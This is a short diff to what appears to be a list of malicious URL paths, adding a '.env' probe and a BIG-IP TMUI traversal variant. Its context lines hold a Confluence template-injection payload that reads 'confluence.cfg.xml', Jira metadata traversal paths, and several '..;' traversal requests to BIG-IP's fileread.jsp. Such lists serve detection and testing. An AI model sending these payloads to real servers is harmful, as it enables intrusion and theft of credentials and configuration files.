@@ -1,4 +1,5 @@
 /$%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%27nashorn%27%29.eval%28%27cat%20confluence.cfg.xml%27%29%7D/
+/%2eenv;
 /%2fadminphp%2ephp'
 /'
 /'%20+%20encodeURI(post.image_fallback)%20+%20'
@@ -35,6 +36,7 @@
 /s/93e2634313e27363e2237313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
 /s/93e2635313e27363e2237313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
 /tmui/login%2ejsp/%2e%2e;/tmui/locallb/workspace/fileread%2ejsp
+/tmui/login.jsp/%2e%2e;/tmui/locallb/workspace/fileread.jsp
 /tmui/login.jsp/%2e.;/tmui/locallb/workspace/fileRead.jsp
 /tmui/login.jsp/%2e.;/tmui/locallb/workspace/fileread.jsp
 /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp
